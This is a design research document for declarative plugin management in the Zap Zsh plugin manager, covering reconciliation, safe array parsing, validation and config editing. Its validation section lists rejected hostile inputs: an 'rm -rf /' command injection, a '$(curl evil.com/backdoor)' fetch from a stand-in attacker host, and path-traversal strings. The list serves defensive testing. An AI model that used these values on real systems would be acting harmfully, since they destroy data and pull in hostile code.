# Research: Declarative Plugin Management

**Feature**: Declarative Plugin Management
**Date**: 2025-10-18
**Status**: Complete

## Overview

This research consolidates findings from three specialized investigations:
1. Declarative configuration patterns from production systems (NixOS, Docker, Kubernetes, Terraform)
2. Zsh array parsing techniques for safe plugin specification handling
3. Plugin unloading strategies for reconciliation support

---

## 1. Core Declarative Patterns

### 1.1 Desired vs. Current State Model

**Pattern**: All declarative systems separate three states:

- **Desired State**: User's configuration file (what should exist)
- **Current State**: Actual runtime state (what exists)
- **Last Applied**: Previous configuration (for three-way merge)

**Application to Zap**:
```zsh
# Desired state: plugins=() array in .zshrc
desired_plugins=($(parse_config ~/.zshrc))

# Current state: actually loaded plugins
current_plugins=($(query_loaded_plugins))

# Reconciliation: align current → desired
diff=$(compare $desired_plugins $current_plugins)
apply_changes $diff
```

### 1.2 Idempotent Reconciliation

**Pattern**: Running operations multiple times produces same result as once.

**NixOS Example**:
```nix
# Running nixos-rebuild multiple times with same config = same system state
nixos-rebuild switch  # First run: changes applied
nixos-rebuild switch  # Second run: no changes (already applied)
```

**Zap Implementation**:
```zsh
_zap_reconcile() {
  # Check-then-act pattern (idempotent)
  if [[ ! -d "$plugin_cache_dir/.git" ]]; then
    git clone "$plugin_url" "$plugin_cache_dir"
  fi

  if ! _zap_is_plugin_loaded "$plugin_id"; then
    _zap_load_plugin "$plugin_id"
  fi
}
```

### 1.3 Level-Based Reconciliation (Kubernetes Model)

**Pattern**: Don't react to events; instead, periodically compare desired vs. current and reconcile.

**Kubernetes Controller Loop**:
```
loop forever:
  desired = read_manifest()
  current = query_cluster()
  diff = compare(desired, current)
  if diff:
    reconcile(diff)
  sleep(interval)
```

**Zap Application**:
- On shell startup: Quick check (file mtime only)
- On `zap sync`: Full reconciliation (expensive)
- No continuous loop (not a daemon)

### 1.4 Preview Mode (Terraform plan)

**Pattern**: Show what would change WITHOUT executing.

**Terraform Workflow**:
```bash
terraform plan   # Shows: +create, ~update, -delete
terraform apply  # Actually executes
```

**Zap Commands**:
```zsh
zap diff   # Shows: would install X, would remove Y (preview)
zap sync   # Actually executes the changes
```

### 1.5 Atomic Operations (NixOS Generations)

**Pattern**: Build new state completely, then switch atomically.

**NixOS Approach**:
```bash
# Build new system in /nix/store
nix-build configuration.nix

# Atomic symlink switch
ln -sfn /nix/store/new-system /run/current-system

# Instant rollback available
ln -sfn /nix/store/previous-system /run/current-system
```

**Zap Metadata Updates**:
```zsh
# Write to temp file
echo "typeset -gA META; META[...]='...'" > metadata.tmp

# Atomic rename (POSIX guarantee on same filesystem)
mv metadata.tmp metadata.zsh
```

---

## 2. Reconciliation Algorithm

### 2.1 Two-Way Merge (Recommended for Zap v1)

**Algorithm**:
```zsh
_zap_sync() {
  # 1. Parse desired state from config
  local -a desired
  desired=($(parse_plugins_array ~/.zshrc))

  # 2. Query current loaded plugins
  local -a current
  current=($(list_loaded_plugins))

  # 3. Compute diff using Zsh set operations
  local -a to_install to_remove
  to_install=(${desired:|current})   # Elements in desired but not current
  to_remove=(${current:|desired})    # Elements in current but not desired

  # 4. Preview changes
  if [[ ${#to_install[@]} -gt 0 || ${#to_remove[@]} -gt 0 ]]; then
    echo "Changes to be applied:"
    for plugin in "${to_install[@]}"; do
      echo "  + $plugin (install)"
    done
    for plugin in "${to_remove[@]}"; do
      echo "  - $plugin (remove)"
    done

    read "REPLY?Continue? [Y/n] "
    [[ "$REPLY" =~ ^[Nn]$ ]] && return 0
  else
    echo "Already synced. No changes needed."
    return 0
  fi

  # 5. Apply changes
  # For v1: exec zsh (full reload)
  # For v2: incremental unload/reload

  # Preserve history
  setopt INC_APPEND_HISTORY
  fc -W

  # Reload shell
  exec zsh
}
```

### 2.2 Three-Way Merge (Future Enhancement)

**Concept**: Handle manual changes intelligently by comparing three versions:
- **Last applied**: What config said before
- **Current live**: What's actually running now
- **New desired**: What config says now

**Example Scenario**:
```
Last applied: [A, B, C]
Current live: [A, B, C, D]  # User manually loaded D
New desired:  [A, B, C, E]  # Config changed C to E

Smart merge: [A, B, C, D, E]  # Keep manual addition D
```

**Complexity**: High. Defer to v2+.

---

## 3. State Tracking Design

### 3.1 Metadata Schema

**File**: `$ZAP_DATA_DIR/state.zsh`

```zsh
typeset -gA ZAP_PLUGIN_STATE

# Example entries:
ZAP_PLUGIN_STATE[zsh-syntax-highlighting:source]="declared"
ZAP_PLUGIN_STATE[zsh-syntax-highlighting:version]="master"
ZAP_PLUGIN_STATE[zsh-syntax-highlighting:loaded]="true"

ZAP_PLUGIN_STATE[powerlevel10k:source]="experimental"
ZAP_PLUGIN_STATE[powerlevel10k:version]="v1.16.1"
ZAP_PLUGIN_STATE[powerlevel10k:loaded]="true"
```

**Keys**:
- `plugin:source` → `declared` | `experimental`
- `plugin:version` → Git ref (commit, tag, branch)
- `plugin:loaded` → `true` | `false`
- `plugin:config_spec` → Original spec from config (for comparison)

### 3.2 State Transitions

**Declared Plugin Lifecycle**:
```
[declared in config] → [load on startup] → [loaded + source=declared]
                    ↓
              [removed from config] → [unload on sync] → [removed]
```

**Experimental Plugin Lifecycle**:
```
[zap try foo/bar] → [loaded + source=experimental]
                  ↓
            [zap sync] → [unloaded + removed]
                  ↓
            [zap adopt] → [added to config] → [source=declared]
```

### 3.3 State Queries

**Commands that need state**:

```zsh
zap status    # Show: declared (3), experimental (2), drift (1)
zap diff      # Show: would add X, would remove Y
zap sync      # Reconcile current → desired
zap adopt P   # Move P from experimental → declared
```

**Implementation**:
```zsh
_zap_get_declared_plugins() {
  # Parse from config file
  _zap_extract_plugins_array ~/.zshrc
}

_zap_get_loaded_plugins() {
  # Query from state file
  local -a loaded
  _zap_load_state
  for key in ${(k)ZAP_PLUGIN_STATE}; do
    if [[ "$key" == *:loaded && "${ZAP_PLUGIN_STATE[$key]}" == "true" ]]; then
      local plugin="${key%:loaded}"
      loaded+=("$plugin")
    fi
  done
  print -l "${loaded[@]}"
}

_zap_get_experimental_plugins() {
  # Filter by source=experimental
  local -a experimental
  _zap_load_state
  for key in ${(k)ZAP_PLUGIN_STATE}; do
    if [[ "$key" == *:source && "${ZAP_PLUGIN_STATE[$key]}" == "experimental" ]]; then
      local plugin="${key%:source}"
      experimental+=("$plugin")
    fi
  done
  print -l "${experimental[@]}"
}
```

---

## 4. Plugin Specification Parsing

### 4.1 Format Specification

**Zap Plugin Spec**: `owner/repo[@version][:subdir]`

**Components**:
- `owner/repo` (required): GitHub repository
- `@version` (optional): Git ref (tag, commit, branch)
- `:subdir` (optional): Subdirectory within repo

**Examples**:
```
zsh-users/zsh-syntax-highlighting
zsh-users/zsh-autosuggestions@v0.7.0
ohmyzsh/ohmyzsh:plugins/git
ohmyzsh/ohmyzsh@master:plugins/docker
```

### 4.2 Safe Parsing Strategy

**Problem**: Sourcing `.zshrc` executes all code (dangerous).

**Solution**: Text-based parsing without execution.

**Implementation**:
```zsh
_zap_extract_plugins_array() {
  local zshrc="$1"
  local in_array=0
  local array_content=""

  while IFS= read -r line; do
    # Skip comments
    [[ "$line" =~ ^[[:space:]]*# ]] && continue

    # Detect array start
    if [[ "$line" =~ ^[[:space:]]*plugins[[:space:]]*=\( ]]; then
      in_array=1
      # Check for single-line array
      if [[ "$line" =~ \) ]]; then
        array_content="${line#*\(}"
        array_content="${array_content%\)*}"
        break
      fi
      continue
    fi

    # Collect array elements
    if [[ $in_array -eq 1 ]]; then
      if [[ "$line" =~ \) ]]; then
        local final="${line%%\)*}"
        [[ -n "$final" ]] && array_content+=" $final"
        break
      else
        array_content+=" $line"
      fi
    fi
  done < "$zshrc"

  # Parse using Zsh (z) flag (shell-aware splitting)
  local -a elements
  elements=("${(z)array_content}")

  # Unquote and output
  for elem in "${(@)elements}"; do
    elem="${(Q)elem}"  # Remove one level of quoting
    echo "$elem"
  done
}
```

**Why this works**:
- No code execution (text processing only)
- Handles quoted elements correctly via `(z)` flag
- Respects shell escaping rules
- Fast and safe

### 4.3 Validation

**Security**: Prevent command injection, path traversal.

**Regex Validation**:
```zsh
_zap_validate_plugin_spec() {
  local spec="$1"

  # Reject empty
  [[ -z "$spec" ]] && return 1

  # Allow only: alphanumeric, dash, underscore, slash, colon, @, dot
  if [[ ! "$spec" =~ ^[a-zA-Z0-9/_:@.\-]+$ ]]; then
    return 1
  fi

  # Must have exactly one slash (owner/repo)
  local slashes="${spec//[^\/]}"
  [[ ${#slashes} -ne 1 ]] && return 1

  # Path traversal check (if subdir present)
  if [[ "$spec" == *:* ]]; then
    local subdir="${spec##*:}"
    [[ "$subdir" == *..* ]] && return 1  # Reject ../
    [[ "$subdir" == /* ]] && return 1     # Reject /absolute
  fi

  return 0
}
```

**Malicious Examples (all rejected)**:
```
user/repo; rm -rf /
user/repo$(curl evil.com/backdoor)
../../../etc/passwd
user/repo:../../escape
```

---

## 5. Plugin Unloading Strategy

### 5.1 Full Reload Approach (Recommended for v1)

**Rationale**:
- Guarantees clean state
- Handles all edge cases (completions, complex plugins)
- Simple implementation (~50 LOC)
- Acceptable UX for v1

**Implementation**:
```zsh
_zap_cmd_sync() {
  # 1. Validate and preview changes
  local -a changes
  changes=($(_zap_compute_sync_changes))

  if [[ ${#changes[@]} -eq 0 ]]; then
    echo "Already synced. No changes needed."
    return 0
  fi

  # 2. Show preview
  _zap_print_sync_preview "${changes[@]}"

  # 3. Confirm
  read "REPLY?Apply changes? [Y/n] "
  [[ "$REPLY" =~ ^[Nn]$ ]] && return 0

  # 4. Preserve history
  setopt INC_APPEND_HISTORY
  fc -W  # Write history to disk

  # 5. Update state file
  _zap_update_state_for_sync

  # 6. Reload shell
  echo "Reloading shell..."
  exec zsh
}
```

**What's preserved**:
- ✅ Command history (via `INC_APPEND_HISTORY` + `fc -W`)
- ✅ Current directory (via `$PWD`)
- ✅ Exported variables

**What's lost**:
- ❌ Shell-local variables (not exported)
- ❌ Background jobs
- ❌ Shell functions from user session

**Trade-off**: Acceptable for v1. Users can use `export` for important vars.

### 5.2 Incremental Unload (Future v2)

**Complexity**: High. Requires tracking all plugin state changes.

**State to Track**:
- Functions defined
- Variables set
- Hooks registered (`precmd_functions`, `chpwd_functions`, etc.)
- fpath modifications
- Aliases created
- Keybindings set
- ZLE widgets created
- Shell options changed

**Zinit's Approach**:
1. Snapshot state before sourcing plugin
2. Source plugin
3. Snapshot state after
4. Compute diff and store in metadata
5. On unload, reverse all changes

**Defer to v2+** due to complexity.

---

## 6. File Modification Strategy (zap adopt)

### 6.1 Challenge

When user runs `zap adopt plugin-name`, we need to:
- Append plugin to `plugins=()` array in `.zshrc`
- Preserve formatting and comments
- Avoid breaking syntax
- Handle both single-line and multi-line arrays

### 6.2 Recommended Approach: AWK-Based Insertion

**Implementation**:
```zsh
_zap_adopt_plugin() {
  local plugin_spec="$1"
  local zshrc="${ZDOTDIR:-$HOME}/.zshrc"

  # Validate
  _zap_validate_plugin_spec "$plugin_spec" || return 1

  # Check already present
  if _zap_plugin_in_config "$plugin_spec" "$zshrc"; then
    echo "Plugin already declared: $plugin_spec"
    return 0
  fi

  # Backup
  local backup="${zshrc}.backup.$(date +%Y%m%d%H%M%S)"
  cp "$zshrc" "$backup" || return 1

  # Use awk to insert
  local temp="${zshrc}.tmp.$$"

  awk -v plugin="$plugin_spec" '
    BEGIN { found=0; inserted=0 }

    # Match plugins=( opening
    /^[[:space:]]*plugins[[:space:]]*=\(/ {
      found=1
      print
      next
    }

    # If inside array and hit closing paren alone
    found && /^[[:space:]]*\)[[:space:]]*$/ {
      # Insert before closing
      print "  '\''" plugin "'\''"
      inserted=1
      found=0
    }

    # Default: print line
    { print }

    # If never found array, create it
    END {
      if (!inserted) {
        print ""
        print "plugins=("
        print "  '\''" plugin "'\''"
        print ")"
      }
    }
  ' "$zshrc" > "$temp"

  # Atomic replace
  mv "$temp" "$zshrc" && echo "✓ Adopted $plugin_spec"
}
```

**Key Techniques**:
- AWK processes line-by-line (safe, no code execution)
- Atomic write (temp file + mv)
- Backup before modification
- Handles missing array (creates at end)

---

## 7. Recommendations Summary

### 7.1 Architecture Decisions

| Component | Decision | Rationale |
|-----------|----------|-----------|
| **Config Format** | Zsh array in `.zshrc` | Oh-My-Zsh compatible, zero learning curve |
| **Parsing Method** | Text-based (no sourcing) | Security, speed, safety |
| **Reconciliation (v1)** | Full reload (`exec zsh`) | Simple, safe, guaranteed correct |
| **Reconciliation (v2)** | Incremental unload/reload | Better UX, preserve session state |
| **State Storage** | `$ZAP_DATA_DIR/state.zsh` | Simple, Zsh-native format |
| **Adoption Method** | AWK-based insertion | Preserves format, atomic operation |
| **Validation** | Strict regex allowlist | Prevent injection, path traversal |

### 7.2 Performance Targets

| Operation | Target | Rationale |
|-----------|--------|-----------|
| Parse plugins array | < 10ms | Must be fast for shell startup |
| Compute diff | < 50ms | Interactive command |
| Full sync (exec zsh) | < 500ms | User waits for reload |
| Adopt plugin | < 200ms | File write + validation |

### 7.3 Implementation Phases

**Phase 0: Foundation**
- ✅ Already exists: `_zap_parse_spec()` in `lib/parser.zsh`
- ✅ Already exists: Plugin loading in `lib/loader.zsh`

**Phase 1: Declarative Loading** (MVP)
- [ ] `_zap_extract_plugins_array()` - Parse without sourcing
- [ ] `_zap_load_declared_plugins()` - Auto-load on startup
- [ ] `_zap_validate_plugin_spec()` - Security validation
- [ ] Update `zap.zsh` to call declarative loader

**Phase 2: Experimentation**
- [ ] `zap try` command - Load experimental plugin
- [ ] State tracking (declared vs. experimental)
- [ ] `_zap_update_state()` - Persist state file

**Phase 3: Reconciliation**
- [ ] `zap status` - Show drift
- [ ] `zap diff` - Preview changes
- [ ] `zap sync` - Full reload reconciliation
- [ ] Confirmation prompt

**Phase 4: Adoption**
- [ ] `zap adopt` - Append to config
- [ ] AWK-based file modification
- [ ] Backup creation

**Phase 5: Polish**
- [ ] Error messages and logging
- [ ] Help documentation
- [ ] Integration tests

---

## 8. Key Decisions Made

### Decision 1: plugins=() Array Format

**Choice**: Use Zsh array in `.zshrc` (not separate file)

**Rationale**:
- Oh-My-Zsh compatibility (instant familiarity)
- Supports conditional logic via Zsh syntax
- No separate file to manage
- Natural integration with existing configs

**Trade-off Accepted**: Text parsing cannot evaluate conditionals. Users who need conditionals can use `zap load` in conditional blocks.

### Decision 2: Full Reload for v1

**Choice**: `exec zsh` for reconciliation in v1

**Rationale**:
- Guarantees correctness (no lingering state)
- Handles all edge cases (completions, complex plugins)
- Simple implementation (~100 LOC vs. ~500 LOC for incremental)
- Acceptable UX for v1 (most users reconcile infrequently)

**Future**: v2 can add incremental unload for better UX.

### Decision 3: Two-Way Merge Algorithm

**Choice**: Simple `desired - current` diff (not three-way)

**Rationale**:
- Simpler to reason about
- Covers 95% of use cases
- Three-way merge adds significant complexity

**Future**: v3 could add three-way merge for manual changes preservation.

### Decision 4: Text-Based Parsing

**Choice**: Parse `plugins=()` with text processing (no sourcing)

**Rationale**:
- Security: No code execution
- Speed: Faster than sourcing
- Safety: Cannot break shell state
- Limitation acceptable: Conditionals handled via `zap load`

---

## 9. Security Considerations

### Threat Model

**Threat**: Malicious plugin specification
**Mitigation**: Strict regex validation, allowlist only safe characters

**Threat**: Path traversal in subdirectories
**Mitigation**: Reject `..` and absolute paths

**Threat**: Command injection
**Mitigation**: Never use `eval` with user input, validate before use

**Threat**: File permission issues during adoption
**Mitigation**: Check writability before modification, create backups

**Accepted Risk**: User can modify their own `.zshrc` (by design, not a security boundary)

### Safe Practices

1. **Always validate** plugin specs before use
2. **Never use `eval`** with user-controlled data
3. **Quote all variables** to prevent word splitting
4. **Use Zsh built-ins** for parsing (`(z)`, `(Q)` flags)
5. **Atomic file writes** to prevent corruption
6. **Create backups** before modification

---

## 10. Testing Strategy

### Unit Tests
- Plugin spec validation (malicious inputs rejected)
- Array parsing (quoted elements, multi-line arrays)
- State transitions (declared ↔ experimental)
- File modification (adoption appends correctly)

### Integration Tests
- Full workflow: declare → load → try → adopt → sync
- Multi-machine sync (git pull + sync)
- Error recovery (missing plugins, network failures)
- Concurrent operations (file locking)

### Performance Tests
- Startup time with 20 plugins (< 1s)
- Sync time for 10 plugin changes (< 2s)
- Parse time for large arrays (100 plugins, < 50ms)

---

## 11. References

### Production Systems Analyzed
- NixOS: `/etc/nixos/configuration.nix` → `nixos-rebuild`
- Terraform: `.tf` files → `terraform plan/apply`
- Kubernetes: Manifests → `kubectl apply`
- Docker Compose: `docker-compose.yml` → `docker-compose up`

### Zsh Plugin Managers Studied
- Zinit: State tracking, incremental unload
- Oh-My-Zsh: plugins=() array format
- Prezto: Module loading patterns

### Key Insights
1. **Declarative systems converge on similar patterns** (desired vs. current, reconciliation, preview)
2. **Idempotency is fundamental** for reliability
3. **Full reload is acceptable** when done infrequently
4. **Text parsing is safer** than code execution for config reading
5. **Atomic operations prevent corruption** in concurrent environments

---

**Research Status**: ✅ Complete
**Next Step**: Proceed to data model design and contract definition
